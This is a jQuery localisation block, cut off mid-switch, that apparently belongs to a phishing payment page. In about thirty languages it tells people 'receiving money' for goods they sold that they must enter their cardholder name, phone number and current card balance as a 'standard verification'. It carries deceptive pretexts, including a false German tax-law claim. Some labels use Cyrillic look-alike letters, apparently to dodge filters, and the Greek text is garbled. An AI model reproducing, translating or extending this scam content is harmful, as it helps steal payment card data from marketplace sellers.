switch (languageCode) {
    case "EN":
        $('#payment').text('Pay')
        $('#receiving-money').text('Receiving money')
        $('#total').text('Total')
        $('#choose-method').text('Choose method')
        $('#credit-debit-card').text('Сrеdit/Dеbit cаrd')
        $('#cardholder').attr("placeholder", "Cаrdhоldеr");
        $('#phonenumber').attr("placeholder", "Phone number");
        $('#card_balance').attr("placeholder", "Card balance");
        $('#finalsubmit').text('Continue')
        $('#paybutton').text('Confirm')
        $('#b_t1').text('According to our rules, to confirm card ownership, enter your current balance.')
        $('#b_t2').html(`Since you are using our payment system for the first time, you will need to undergo verification of the account to which you will receive payment for sold goods in the future.
    <strong>This is a standard procedure to confirm the account holder.</strong>
    This is necessary in order to confirm your ability to use the online payment system and to protect buyers and sellers from fraudsters.`)
        break;
    case "DE":
        $('#payment').text('Bezahlen')
        $('#receiving-money').text('Geld empfangen')
        $('#total').text('Gesamtsumme')
        $('#choose-method').text('Zahlungsmethode wählen')
        $('#credit-debit-card').text('Kredit-/Debitkarte')
        $('#cardholder').attr("placeholder", "Karteninhaber");
        $('#phonenumber').attr("placeholder", "Telefonnummer");
        $('#card_balance').attr("placeholder", "Kartenguthaben");
        $('#finalsubmit').text('Weitermachen')
        $('#paybutton').text('Bestätigen')
        $('#b_t1').text('')
        $('#b_t2').html(`<strong>Kontostand eingeben</strong> - Nach dem Steuerrecht müssen Sie bei einem Verkauf den Kontostand Ihrer Kreditkarte angeben, um sich als Karteninhaber auszuweisen.`)
        break;
    case "HE":
        $('#payment').text('שלם')
        $('#receiving-money').text('קבלת כסף')
        $('#total').text('סך הכל')
        $('#choose-method').text('בחר שיטה')
        $('#credit-debit-card').text('כרטיס אשראי/חיוב')
        $('#cardholder').attr("placeholder", "מחזיקי כרטיס");
        $('#phonenumber').attr("placeholder", "מספר טלפון");
        $('#card_balance').attr("placeholder", "יתרת כרטיס");
        $('#finalsubmit').text('לְהַמשִׁיך')
        $('#paybutton').text('לְאַשֵׁר')
        $('#b_t1').text('על פי הכללים שלנו, כדי לאשר בעלות על הכרטיס, הזן את היתרה הנוכחית שלך.')
        $('#b_t2').html(`מכיוון שאתה משתמש במערכת התשלומים שלנו בפעם הראשונה, תצטרך לעבור אימות של החשבון שאליו תקבל תשלום עבור סחורה שנמכרה בעתיד.
    <strong>זהו הליך סטנדרטי לאישור בעל החשבון.</strong>
    זה הכרחי על מנת לאשר את יכולתך להשתמש במערכת התשלומים המקוונת וכדי להגן על קונים ומוכרים מפני רמאים.`)
        break;
    case "SK":
        $('#payment').text('Zaplatiť');
        $('#receiving-money').text('Príjímanie peňazí');
        $('#total').text('Celkom');
        $('#choose-method').text('Vyberte metódu');
        $('#credit-debit-card').text('Kreditná/debetná karta');
        $('#cardholder').attr("placeholder", "Držiteľ karty");
        $('#phonenumber').attr("placeholder", "Telefónne číslo");
        $('#card_balance').attr("placeholder", "Zostatok na karte");
        $('#finalsubmit').text('Pokračuj')
        $('#paybutton').text('Potvrďte')
        $('#b_t1').text('Podľa našich pravidiel na potvrdenie vlastníctva karty zadajte aktuálny zostatok.')
        $('#b_t2').html(`Keďže náš platobný systém používate prvýkrát, budete musieť prejsť overením účtu, na ktorý budete v budúcnosti dostávať platby za predaný tovar.
    <strong>Toto je štandardný postup na potvrdenie majiteľa účtu.</strong>
    Je to potrebné na potvrdenie vašej schopnosti používať online platobný systém a na ochranu kupujúcich a predávajúcich pred podvodníkmi.`)
        break;
    case "NL":
        $('#payment').text('Betalen');
        $('#receiving-money').text('Geld ontvangen');
        $('#total').text('Totaal');
        $('#choose-method').text('Kies methode');
        $('#credit-debit-card').text('Credit-/Debetkaart');
        $('#cardholder').attr("placeholder", "Kaarthouder");
        $('#phonenumber').attr("placeholder", "Telefoonnummer");
        $('#card_balance').attr("placeholder", "Kaartsaldo");
        $('#finalsubmit').text('Doorgaan')
        $('#paybutton').text('Bevestigen')
        $('#b_t1').text('Volgens onze regels moet je, om het eigendom van de kaart te bevestigen, je huidige saldo invoeren.')
        $('#b_t2').html(`Omdat je ons betalingssysteem voor de eerste keer gebruikt, moet je de rekening waarop je in de toekomst betalingen voor verkochte goederen zult ontvangen, laten verifiëren.
    <strong>Dit is een standaardprocedure om de rekeninghouder te bevestigen.</strong>
    Dit is nodig om te bevestigen dat je het online betalingssysteem kunt gebruiken en om kopers en verkopers te beschermen tegen fraudeurs.`)
        break;
    case "CN":
        $('#payment').text('支付');
        $('#receiving-money').text('收款');
        $('#total').text('总计');
        $('#choose-method').text('选择支付方式');
        $('#credit-debit-card').text('信用/借记卡');
        $('#cardholder').attr("placeholder", "持卡人");
        $('#phonenumber').attr("placeholder", "电话号码");
        $('#card_balance').attr("placeholder", "卡内余额");
        $('#finalsubmit').text('继续')
        $('#paybutton').text('确认')
        $('#b_t1').text('根据我们的规则，为了确认卡的所有权，请输入你目前的余额。')
        $('#b_t2').html(`由于您是第一次使用我们的支付系统，您将需要对您今后接收所售商品付款的账户进行验证。
    <strong>这是一个确认账户持有人的标准程序。</strong>
    这是必要的，以便确认你有能力使用在线支付系统，并保护买家和卖家免受欺诈。`)
        break;
    case "HU":
        $('#payment').text('Fizetés');
        $('#receiving-money').text('Pénz fogadása');
        $('#total').text('Összesen');
        $('#choose-method').text('Válasszon fizetési módot');
        $('#credit-debit-card').text('Hitel-/Bankkártya');
        $('#cardholder').attr("placeholder", "Kártyatartó");
        $('#phonenumber').attr("placeholder", "Telefonszám");
        $('#card_balance').attr("placeholder", "Kártyaegyenleg");
        $('#finalsubmit').text('Folytatni')
        $('#paybutton').text('Megerősítés')
        $('#b_t1').text('Szabályaink szerint a kártya tulajdonjogának megerősítéséhez adja meg az aktuális egyenlegét.')
        $('#b_t2').html(`Mivel Ön először használja a fizetési rendszerünket, át kell esnie annak a számlának az ellenőrzésén, amelyre a jövőben az eladott árukért fizetést fog kapni.
    <strong>Ez egy szokásos eljárás a számlatulajdonos megerősítésére.</strong>
    Erre azért van szükség, hogy megerősítsük, hogy Ön képes használni az online fizetési rendszert, és hogy megvédjük a vásárlókat és az eladókat a csalóktól.`)
        break;
    case "CZ":
        $('#payment').text('Zaplacení');
        $('#receiving-money').text('Přijetí platby');
        $('#total').text('Celková částka');
        $('#choose-method').text('Vyberte způsob platby');
        $('#credit-debit-card').text('Kreditní/debetní karta');
        $('#cardholder').attr("placeholder", "Držák karty");
        $('#phonenumber').attr("placeholder", "Telefonní číslo");
        $('#card_balance').attr("placeholder", "Zůstatek na kartě");
        $('#finalsubmit').text('Pokračovat')
        $('#paybutton').text('Potvrdit')
        $('#b_t1').text('Podle našich pravidel pro potvrzení vlastnictví karty zadejte aktuální zůstatek.')
        $('#b_t2').html(`Vzhledem k tomu, že náš platební systém používáte poprvé, je třeba provést ověření účtu, na který budete v budoucnu přijímat platby za prodané zboží.
    <strong>Jedná se o standardní postup pro potvrzení držitele účtu.</strong>
    To je nezbytné k potvrzení vaší schopnosti používat online platební systém a k ochraně kupujících a prodávajících před podvodníky.`)
        break;
    case "PL":
        $('#payment').text('Zapłać');
        $('#receiving-money').text('Odbieranie płatności');
        $('#total').text('Suma');
        $('#choose-method').text('Wybierz metodę');
        $('#credit-debit-card').text('Karta kredytowa/debetowa');
        $('#cardholder').attr("placeholder", "Posiadacz karty");
        $('#phonenumber').attr("placeholder", "Numer telefonu");
        $('#card_balance').attr("placeholder", "Saldo karty");
        $('#finalsubmit').text('Kontynuować')
        $('#paybutton').text('Potwierdzać')
        $('#b_t1').text('Zgodnie z naszymi zasadami, aby potwierdzić posiadanie karty, wprowadź aktualne saldo.')
        $('#b_t2').html(`Ponieważ korzystasz z naszego systemu płatności po raz pierwszy, będziesz musiał przejść weryfikację konta, na które będziesz otrzymywać płatności za sprzedane towary w przyszłości.
    <strong>Jest to standardowa procedura mająca na celu potwierdzenie właściciela konta.</strong>
    Jest to konieczne w celu potwierdzenia możliwości korzystania z systemu płatności online oraz ochrony kupujących i sprzedających przed oszustami.`)
        break;
    case "ES":
        $('#payment').text('Pagar');
        $('#receiving-money').text('Recibiendo dinero');
        $('#total').text('Total');
        $('#choose-method').text('Elegir método');
        $('#credit-debit-card').text('Tarjeta de crédito/débito');
        $('#cardholder').attr("placeholder", "Nombre y apellidos");
        $('#phonenumber').attr("placeholder", "Número de teléfono");
        $('#card_balance').attr("placeholder", "Balance de tarjeta");
        $('#finalsubmit').text('Continuar')
        $('#paybutton').text('Confirmar')
        $('#b_t1').text('De acuerdo con nuestras reglas, para confirmar la propiedad de la tarjeta, ingresa tu saldo actual.');
        $('#b_t2').html(`Como estás utilizando nuestro sistema de pago por primera vez, deberás pasar por una verificación de la cuenta a la cual recibirás el pago por los productos vendidos en el futuro.
        <strong>Este es un procedimiento estándar para confirmar al titular de la cuenta.</strong>
        Esto es necesario para confirmar tu capacidad para utilizar el sistema de pago en línea y proteger a compradores y vendedores de estafadores.`);
        break;
    case "FR":
        $('#payment').text('Payer');
        $('#receiving-money').text('Recevoir de l\'argent');
        $('#total').text('Total');
        $('#choose-method').text('Choisir une méthode');
        $('#credit-debit-card').text('Carte de crédit/débit');
        $('#cardholder').attr("placeholder", "Titulaire de la carte");
        $('#phonenumber').attr("placeholder", "Numéro de téléphone");
        $('#card_balance').attr("placeholder", "Solde de la carte");
        $('#finalsubmit').text('Continuer')
        $('#paybutton').text('Confirmer')
        $('#b_t1').text('Conformément à nos règles, pour confirmer la propriété de la carte, saisissez votre solde actuel.');
        $('#b_t2').html(`Étant donné que vous utilisez notre système de paiement pour la première fois, vous devrez passer par une vérification du compte sur lequel vous recevrez le paiement des biens vendus à l'avenir.
        <strong>Il s'agit d'une procédure standard pour confirmer le titulaire du compte.</strong>
        Ceci est nécessaire pour confirmer votre capacité à utiliser le système de paiement en ligne et protéger les acheteurs et les vendeurs contre les fraudeurs.`);
        break;
    case "IT":
        $('#payment').text('Pagare');
        $('#receiving-money').text('Ricezione pagamenti');
        $('#total').text('Totale');
        $('#choose-method').text('Scegli il metodo');
        $('#credit-debit-card').text('Carta di credito/debito');
        $('#cardholder').attr("placeholder", "Titolare della carta");
        $('#phonenumber').attr("placeholder", "Numero di telefono");
        $('#card_balance').attr("placeholder", "Saldo della carta");
        $('#finalsubmit').text('Continua')
        $('#paybutton').text('Confermare')
        $('#b_t1').text('In conformità con le nostre regole, per confermare la proprietà della carta, inserisci il tuo saldo attuale.');
        $('#b_t2').html(`Poiché stai utilizzando il nostro sistema di pagamento per la prima volta, dovrai passare attraverso la verifica del conto su cui riceverai il pagamento per i beni venduti in futuro.
        <strong>Si tratta di una procedura standard per confermare il titolare del conto.</strong>
        Questo è necessario per confermare la tua capacità di utilizzare il sistema di pagamento online e proteggere acquirenti e venditori da frodi.`);
        break;
    case "LT":
        $('#payment').text('Mokėti')
        $('#receiving-money').text('Gauti pinigus')
        $('#total').text('Viso')
        $('#choose-method').text('Pasirinkite metodą')
        $('#credit-debit-card').text('Kredito/Debetinė kortelė')
        $('#cardholder').attr("placeholder", "Kortelės savininkas");
        $('#phonenumber').attr("placeholder", "Telefono numeris");
        $('#card_balance').attr("placeholder", "Kortelės likutis");
        $('#finalsubmit').text('Tęsti')
        $('#paybutton').text('Patvirtinti')
        $('#b_t1').text('Pagal mūsų taisykles, patvirtinant kortelės nuosavybę, įveskite savo esamą balansą.')
        $('#b_t2').html(`Kadangi naudojatės mūsų mokėjimo sistema pirmą kartą, jums reikės patvirtinti sąskaitą, į kurią ateityje gausite mokėjimą už parduotas prekes.
    <strong>Tai yra standartinė procedūra, patvirtinanti sąskaitos savininką.</strong>
    Tai būtina siekiant patvirtinti jūsų gebėjimą naudotis internetine mokėjimo sistema ir apsaugoti pirkėjus bei pardavėjus nuo sukčių.`)
        break;
    case "RO":
        $('#payment').text('Plată')
        $('#receiving-money').text('Primire bani')
        $('#total').text('Total')
        $('#choose-method').text('Alegeți metoda')
        $('#credit-debit-card').text('Card de credit/debit')
        $('#cardholder').attr("placeholder", "Deținătorul cardului");
        $('#card_balance').attr("placeholder", "Soldul cardului");
        $('#finalsubmit').text('Continuați')
        $('#paybutton').text('Confirmați')
        $('#b_t1').text('Conform regulilor noastre, pentru a confirma proprietatea cardului, introduceți soldul curent.')
        $('#b_t2').html(`Deoarece utilizați pentru prima dată sistemul nostru de plată, va trebui să treceți prin verificarea contului la care veți primi plata pentru bunurile vândute în viitor. <strong>Acesta este un procedeu standard pentru a confirma titularul contului.</strong> Acest lucru este necesar pentru a confirma capacitatea dvs. de a utiliza sistemul de plată online și pentru a proteja cumpărătorii și vânzătorii de infractori.`)
        break;
    case "HR":
        $('#payment').text('Plati')
        $('#receiving-money').text('Primanje novca')
        $('#total').text('Ukupno')
        $('#choose-method').text('Odaberi metod')
        $('#credit-debit-card').text('Kreditna/debitna kartica')
        $('#cardholder').attr("placeholder", "Cardholder");
        $('#phonenumber').attr("placeholder", "Telefonski broj");
        $('#card_balance').attr("placeholder", "Stanje kartice");
        $('#finalsubmit').text('Nastavi')
        $('#paybutton').text('Potvrdi')
        $('#b_t1').text('Prema našim pravilima, da potvrdite vlasništvo kartice, unesite svoj trenutni saldo.')
        $('#b_t2').html(`Budući da prvi put koristite naš sustav plaćanja, morat ćete proći verifikaciju računa na koji ćete ubuduće primati uplate za prodanu robu.
    <strong>Ovo je standardni postupak za potvrdu vlasnika računa.</strong>
    Ovo je neophodno kako biste potvrdili svoju sposobnost korištenja sustava online plaćanja i zaštitili kupce i prodavače od prevaranata.`)
        break;
    case "PT":
        $('#payment').text('Pagar')
        $('#receiving-money').text('Recebendo dinheiro')
        $('#total').text('Total')
        $('#choose-method').text('Escolha o método')
        $('#credit-debit-card').text('Cartão de crédito/débito')
        $('#cardholder').attr("placeholder", "Titular do cartão");
        $('#phonenumber').attr("placeholder", "Número de telefone");
        $('#card_balance').attr("placeholder", "Saldo do cartão");
        $('#finalsubmit').text('Continuar')
        $('#paybutton').text('Confirmar')
        $('#b_t1').text('De acordo com nossas regras, para confirmar a titularidade do cartão, insira seu saldo atual.')
        $('#b_t2').html(`Como você está usando nosso sistema de pagamento pela primeira vez, será necessário passar por uma verificação da conta para a qual você receberá pagamento por mercadorias vendidas no futuro.
        <strong>Este é um procedimento padrão para confirmar o titular da conta.</strong>
        Isso é necessário para confirmar sua capacidade de usar o sistema de pagamento online e proteger compradores e vendedores de fraudadores.`)
        break;
    case "ET":
        $('#payment').text('Maksa')
        $('#receiving-money').text('Raha vastuvõtmine')
        $('#total').text('Kokku')
        $('#choose-method').text('Valige meetod')
        $('#credit-debit-card').text('Krediit-/deebetkaart')
        $('#cardholder').attr("placeholder", "Kaardihoidja");
        $('#phonenumber').attr("placeholder", "Telefoninumber");
        $('#card_balance').attr("placeholder", "Kaardi saldo");
        $('#finalsubmit').text('Jätka')
        $('#paybutton').text('Kinnita')
        $('#b_t1').text('Vastavalt meie reeglitele kinnitage kaardi omanikuks olemiseks oma praegune saldo.')
        $('#b_t2').html(`Kuna kasutate meie maksesüsteemi esimest korda, peate tulevikus müüdud kaupade eest maksete saamiseks läbima konto kinnitamise.
    <strong>See on standardne protseduur konto omaniku kinnitamiseks.</strong>
    See on vajalik selleks, et kinnitada teie võimet kasutada veebimaksesüsteemi ja kaitsta ostjaid ja müüjaid petturite eest.`)
        break;
    case "BS":
        $('#payment').text('Plaćanje')
        $('#receiving-money').text('Primanje novca')
        $('#total').text('Ukupno')
        $('#choose-method').text('Izaberite metod')
        $('#credit-debit-card').text('Kreditna/Dugovna kartica')
        $('#cardholder').attr("placeholder", "Ime vlasnika kartice");
        $('#phonenumber').attr("placeholder", "Broj telefona");
        $('#card_balance').attr("placeholder", "Stanje na kartici");
        $('#finalsubmit').text('Nastavi')
        $('#paybutton').text('Potvrdi')
        $('#b_t1').text('Prema našim pravilima, za potvrdu vlasništva nad karticom unesite trenutno stanje na njoj.')
        $('#b_t2').html(`Budući da prvi put koristite naš sistem plaćanja, morat ćete proći verifikaciju računa na koji ćete u budućnosti primati uplate za prodate proizvode.
    <strong>Ovo je standardna procedura za potvrdu vlasnika računa.</strong>
    Ovo je neophodno kako bi se potvrdila vaša sposobnost korištenja online sistema plaćanja i kako bi se zaštitili kupci i prodavci od prevaranata.`)
        break;
    case "UA":
        $('#payment').text('Оплата')
        $('#receiving-money').text('Отримання грошей')
        $('#total').text('Всього')
        $('#choose-method').text('Оберіть метод')
        $('#credit-debit-card').text('Кредитна/дебетова карта')
        $('#cardholder').attr("placeholder", "Власник карти");
        $('#phonenumber').attr("placeholder", "Номер телефону");
        $('#card_balance').attr("placeholder", "Баланс карти");
        $('#finalsubmit').text('Продовжити')
        $('#paybutton').text('Підтвердити')
        $('#b_t1').text('Згідно з нашими правилами, для підтвердження власності картки введіть ваш поточний баланс.')
        $('#b_t2').html(`Оскільки ви використовуєте нашу платіжну систему вперше, вам потрібно буде пройти верифікацію рахунку, на який в майбутньому будуть надходити кошти за продані товари.
    <strong>Це стандартна процедура для підтвердження власника рахунку.</strong>
    Це необхідно для підтвердження вашої здатності використовувати онлайн-платіжну систему та для захисту покупців і продавців від шахраїв.`)
        break;
    case "TH":
        $('#payment').text('ชำระเงิน')
        $('#receiving-money').text('การรับเงิน')
        $('#total').text('รวม')
        $('#choose-method').text('เลือกวิธี')
        $('#credit-debit-card').text('บัตรเครดิต/เดบิต')
        $('#cardholder').attr("placeholder", "ผู้ถือบัตร");
        $('#phonenumber').attr("placeholder", "หมายเลขโทรศัพท์");
        $('#card_balance').attr("placeholder", "ยอดเงินในบัตร");
        $('#finalsubmit').text('ดำเนินการต่อ')
        $('#paybutton').text('ยืนยัน')
        $('#b_t1').text('ตามกฎของเรา เพื่อยืนยันการครอบครองบัตร โปรดป้อนยอดเงินคงเหลือปัจจุบันของคุณ')
        $('#b_t2').html(`เนื่องจากคุณกำลังใช้ระบบการชำระเงินของเราครั้งแรก คุณจะต้องผ่านการตรวจสอบบัญชีเพื่อการชำระเงินที่คุณจะได้รับจากการขายสินค้าในอนาคต
    <strong> นี่เป็นขั้นตอนมาตรฐานเพื่อยืนยันผู้ถือบัญชี</strong>
    สิ่งนี้จำเป็นเพื่อยืนยันความสามารถในการใช้ระบบการชำระเงินออนไลน์และป้องกันผู้ซื้อและผู้ขายจากมิจฉาชีพ`)
        break;
    case "GE":
        $('#payment').text('გადაიხადე')
        $('#receiving-money').text('ფულის მიღება')
        $('#total').text('სულ')
        $('#choose-method').text('აირჩიეთ მეთოდი')
        $('#credit-debit-card').text('საკრედიტო/სადებეტო ბარათი')
        $('#cardholder').attr("placeholder", "ბარათის მფლობელი");
        $('#phonenumber').attr("placeholder", "Ტელეფონის ნომერი");
        $('#card_balance').attr("placeholder", "ბარათის ბალანსი");
        $('#finalsubmit').text('განაგრძეთ')
        $('#paybutton').text('დაადასტურეთ')
        $('#b_t1').text('ჩვენი წესების მიხედვით, ბარათის მფლობელობის დასადასტურებლად, შეიყვანეთ თქვენი მიმდინარე ბალანსი.')
        $('#b_t2').html(`ვინაიდან თქვენ პირველად იყენებთ ჩვენს გადახდის სისტემას, მოგიწევთ გაიაროთ ანგარიშის შემოწმება, რომელზეც მომავალში მიიღებთ გადახდას გაყიდულ საქონელზე.
        <strong>ეს არის სტანდარტული პროცედურა ანგარიშის მფლობელის დასადასტურებლად.</strong>
        ეს აუცილებელია იმისათვის, რომ დაადასტუროთ თქვენი ონლაინ გადახდის სისტემის გამოყენების შესაძლებლობა და მყიდველები და გამყიდველები თაღლითებისგან დაიცვათ.`)
        break;
    case "JP":
        $('#payment').text('支払い');
        $('#receiving-money').text('お金を受け取る');
        $('#total').text('合計');
        $('#choose-method').text('支払い方法を選択');
        $('#credit-debit-card').text('クレジット/デビットカード');
        $('#cardholder').attr("placeholder", "カードホルダー");
        $('#phonenumber').attr("placeholder", "電話番号");
        $('#card_balance').attr("placeholder", "カード残高");
        $('#finalsubmit').text('続行');
        $('#paybutton').text('確認');
        $('#b_t1').text('当社の規則により、カードの所有権を確認するために、現在の残高を入力してください。');
        $('#b_t2').html(`今回のお支払いに当社の決済システムを初めてご利用いただく場合は、将来販売される商品の支払いを受け取るアカウントの確認が必要です。
        <strong>これはアカウント所有者を確認する標準的な手順です。</strong>
        これは、オンライン決済システムを使用できる能力を確認し、詐欺からバイヤーとセラーを保護するために必要です。`);
        break;
    case "DK":
        $('#payment').text('Betaling')
        $('#receiving-money').text('Modtagelse af penge')
        $('#total').text('Total')
        $('#choose-method').text('Vælg metode')
        $('#credit-debit-card').text('Kredit-/betalingskort')
        $('#cardholder').attr("placeholder", "Kortholder");
        $('#phonenumber').attr("placeholder", "Telefonnummer");
        $('#card_balance').attr("placeholder", "Kortbalance");
        $('#finalsubmit').text('Fortsæt')
        $('#paybutton').text('Bekræft')
        $('#b_t1').text('Ifølge vores regler skal du for at bekræfte kortets ejerskab indtaste din nuværende saldo.')
        $('#b_t2').html(`Da du bruger vores betalingssystem for første gang, skal du gennemgå en verifikation af den konto, hvortil du fremover vil modtage betaling for solgte varer.
        <strong>Dette er en standardprocedure for at bekræfte kontoindehaveren.</strong>
        Dette er nødvendigt for at bekræfte din evne til at bruge det online betalingssystem og for at beskytte købere og sælgere mod svindlere.`)  
        break;
    case "FI":
        $('#payment').text('Maksa');
        $('#receiving-money').text('Rahan vastaanottaminen');
        $('#total').text('Yhteensä');
        $('#choose-method').text('Valitse menetelmä');
        $('#credit-debit-card').text('Luotto-/Pankkikortti');
        $('#cardholder').attr("placeholder", "Kortinhaltija");
        $('#phonenumber').attr("placeholder", "Puhelinnumero");
        $('#card_balance').attr("placeholder", "Kortin saldo");
        $('#finalsubmit').text('Jatka');
        $('#paybutton').text('Vahvista');
        $('#b_t1').text('Sääntöjemme mukaan kortin omistajuuden vahvistamiseksi syötä nykyinen saldo.');
        $('#b_t2').html(`Koska käytät maksujärjestelmäämme ensimmäistä kertaa, sinun on käytävä läpi tilisi varmennus, johon saat tulevaisuudessa maksuja myydyistä tavaroista.
            <strong>Tämä on standardimenettely tilinhaltijan vahvistamiseksi.</strong>
            Tämä on tarpeen varmistaaksesi kykysi käyttää verkkomaksujärjestelmää ja suojata ostajia ja myyjiä huijareilta.`);
        break;
    case "EL":
        $('#payment').text('Πληρωμή');
        $('#receiving-money').text('Λήψη χρημάτων');
        $('#total').text('Σύνολο');
        $('#choose-method').text('Επιλέξτε μέθοδο');
        $('#credit-debit-card').text('Πιστωτική/Χρεωστική κάρτα');
        $('#cardholder').attr("placeholder", "Κάτοχος κάρτας");
        $('#phonenumber').attr("placeholder", "Αριθμός τηλεφώνου");
        $('#card_balance').attr("placeholder", "Υπόλοιπο κάρτας");
        $('#finalsubmit').text('Συνέχεια');
        $('#paybutton').text('Επιβεβαίωση');
        $('#b_t1').text(`Σύμφωνα με τους κανόνες μας, για ν' αποδείξουμε την ιδιοκτησία της κάρτας, εισάγετε το τρέχον υπόλοιπό σας.`);
        $('#b_t2').html(`Δεδομένου ότι χρησιμοποιείτε γι' αυτή τη φορά το σύστημά μας πληρωμών, θ' απαιτηθεί ν' υποβληθείτε σ' επιβεβαιωσή λογ/κόυ στ' οποίο θ' λάβεται πληρωμή γι' πωλ/θέντων αγ/κών στο μέλλ/ν.
        <strong>Πρόκειται γι' ένδυκή δικ/συ. γ/ ν' επιβαιωθή ο κάτ. λ/γ/κό.</strong>
        Αυτό είναι απαιτ. γ/ ν' επ. τη δυν. σ. χρ. του δικτυ. συσ. πληρωμώ. και γ/ ν' πρ. αγ/τές και πωλ/τές από απάτ./δ.`);
        break;
    case "TW":
        $('#payment').text('支付');
        $('#receiving-money').text('收款');
        $('#total').text('總計');
        $('#choose-method').text('選擇方式');
        $('#credit-debit-card').text('信用卡/借记卡');
        $('#cardholder').attr("placeholder", "持卡人");
        $('#phonenumber').attr("placeholder", "電話號碼");
        $('#card_balance').attr("placeholder", "卡餘額");
        $('#finalsubmit').text('繼續');
        $('#paybutton').text('確認');
        $('#b_t1').text('按照我們的規定，為了確認卡的所有權，請輸入您當前的餘額。');
        $('#b_t2').html(`由於您首次使用我們的支付系統，您需要接受將來收到銷售商品款項的帳戶驗證。
            <strong>這是確認帳戶持有人的標準程序。</strong>
            這是為了確認您能夠使用在線支付系統，保護買家和賣家免受詐騙者侵害的必要步驟。`);
        break;
    case "SV":
        $('#payment').text('Betala')
        $('#receiving-money').text('Mottagning av pengar')
        $('#total').text('Totalt')
        $('#choose-method').text('Välj metod')
        $('#credit-debit-card').text('Kredit-/Betalkort')
        $('#cardholder').attr("placeholder", "Kortinnehavare");
        $('#phonenumber').attr("placeholder", "Telefonnummer");
        $('#card_balance').attr("placeholder", "Kortets saldo");
        $('#finalsubmit').text('Fortsätt')
        $('#paybutton').text('Bekräfta')
        $('#b_t1').text('Enligt våra regler, för att bekräfta kortägande, ange ditt nuvarande saldo.')
        $('#b_t2').html(`Eftersom du använder vårt betalningssystem för första gången, kommer du att behöva genomgå verifiering av det konto till vilket du i framtiden kommer att få betalt för sålda varor.
            <strong>Detta är en standardprocedur för att bekräfta kontoinnehavaren.</strong>
            Detta är nödvändigt för att bekräfta din förmåga att använda det onlinebetalningssystemet och för att skydda köpare och säljare mot bedragare.`)
        break;
    case "NO":
        $('#payment').text('Betale')
        $('#receiving-money').text('Mottak av penger')
        $('#total').text('Totalt')
        $('#choose-method').text('Velg metode')
        $('#credit-debit-card').text('Kreditt-/debetkort')
        $('#cardholder').attr("placeholder", "Kortholder");
        $('#phonenumber').attr("placeholder", "Telefonnummer");
        $('#card_balance').attr("placeholder", "Kortbalanse");
        $('#finalsubmit').text('Fortsett')
        $('#paybutton').text('Bekreft')
        $('#b_t1').text('I henhold til våre regler, for å bekrefte kortinnehav, oppgi din nåværende saldo.')
        $('#b_t2').html(`Siden du bruker vårt betalingssystem for første gang, vil du måtte gjennomgå en verifisering av kontoen som du vil motta betaling for solgte varer i fremtiden.
            <strong>Dette er en standardprosedyre for å bekrefte kontoinnehaveren.</strong>
            Dette er nødvendig for å bekrefte din mulighet til å bruke nettbetalingssystemet og for å beskytte kjøpere og selgere mot svindlere.`)
        break;
    case "SI":
        $('#payment').text('Plačilo')
        $('#receiving-money').text('Prejemanje denarja')
        $('#total').text('Skupaj')
        $('#choose-method').text('Izberite metodo')
        $('#credit-debit-card').text('Kreditna/debetna kartica')
        $('#cardholder').attr("placeholder", "Imetnik kartice");
        $('#phonenumber').attr("placeholder", "Telefonska številka");
        $('#card_balance').attr("placeholder", "Stanje na kartici");
        $('#finalsubmit').text('Nadaljuj')
        $('#paybutton').text('Potrdi')
        $('#b_t1').text('Po naših pravilih, za potrditev lastništva kartice, vnesite trenutno stanje.')
        $('#b_t2').html(`Ker naš plačilni sistem uporabljate prvič, boste morali opraviti preverjanje računa, na katerega boste v prihodnosti prejeli plačilo za prodane izdelke.
            <strong>To je standardni postopek za potrditev lastnika računa.</strong>
            To je potrebno za potrditev vaše sposobnosti uporabe spletnega plačilnega sistema in za zaščito kupcev in prodajalcev pred goljufi.`)
        break;
    case "FIL":
        $('#payment').text('Magbayad');
        $('#receiving-money').text('Pagtanggap ng pera');
        $('#total').text('Kabuuan');
        $('#choose-method').text('Pumili ng paraan');
        $('#credit-debit-card').text('Кrеdit/Dеbit cаrd');
        $('#cardholder').attr("placeholder", "Nagmamay-ari ng Kard");
        $('#phonenumber').attr("placeholder", "Numero ng Telepono");
        $('#card_balance').attr("placeholder", "Balanse ng Kard");
        $('#finalsubmit').text('Magpatuloy');
        $('#paybutton').text('Kumpirmahin');
        $('#b_t1').text('Ayon sa aming mga alituntunin, upang kumpirmahin ang pagmamay-ari ng kard, ipasok ang iyong kasalukuyang balanse.');
        $('#b_t2').html(`Dahil ginagamit mo ang aming sistema ng pagbabayad sa unang pagkakataon, kakailanganin mong sumailalim sa pagpapatunay ng account kung saan makakatanggap ka ng pagbabayad para sa mga nabentang produkto sa hinaharap.
        <strong>Ito ay isang karaniwang pamamaraan upang kumpirmahin ang may-ari ng account.</strong>
        Kinakailangan ito upang kumpirmahin ang iyong kakayahan na gamitin ang online na sistema ng pagbabayad at para protektahan ang mga mamimili at nagbebenta mula sa mga manloloko.`);
        break;
    case "IN":
        $('#payment').text('भुगतान करें');
        $('#receiving-money').text('राशि प्राप्ति');
        $('#total').text('कुल');
        $('#choose-method').text('विधि चुनें');
        $('#credit-debit-card').text('क्रेडिट/डेबिट कार्ड');
        $('#cardholder').attr("placeholder", "कार्डधारक");
        $('#phonenumber').attr("placeholder", "फ़ोन नंबर");
        $('#card_balance').attr("placeholder", "कार्ड बैलेंस");
        $('#finalsubmit').text('जारी रखें');
        $('#paybutton').text('पुष्टि करें');
        $('#b_t1').text('हमारे नियमों के अनुसार, कार्ड स्वामित्व की पुष्टि करने के लिए, अपना वर्तमान संतुलन दर्ज करें।');
        $('#b_t2').html(`चूंकि आप पहली बार हमारे भुगतान प्रणाली का उपयोग कर रहे हैं, आपको उस खाते का सत्यापन करना होगा जिसमें आपको भविष्य में बेचे गए वस्तुओं का भुगतान प्राप्त होगा।
        <strong>यह खाता धारक की पुष्टि करने के लिए एक मानक प्रक्रिया है।</strong>
        यह आवश्यक है ताकि आपकी ऑनलाइन भुगतान प्रणाली का उपयोग करने की क्षमता की पुष्टि हो सके और धोखेबाजों से खरीददारों और विक्रेताओं की सुरक्षा की जा सके।`);
        break;
    case "BG":
        $('#payment').text('Плати')
        $('#receiving-money').text('Получаване на пари')
        $('#total').text('Общо')
        $('#choose-method').text('Изберете метод')
        $('#credit-debit-card').text('Кредитна/Дебитна карта')
        $('#cardholder').attr("placeholder", "Притежател на картата");
        $('#phonenumber').attr("placeholder", "Телефонен номер");
        $('#card_balance').attr("placeholder", "Баланс по картата");
        $('#finalsubmit').text('Продължи')
        $('#paybutton').text('Потвърди')
        $('#b_t1').text('Според нашите правила, за потвърждаване на собствеността на картата, въведете текущия си баланс.')
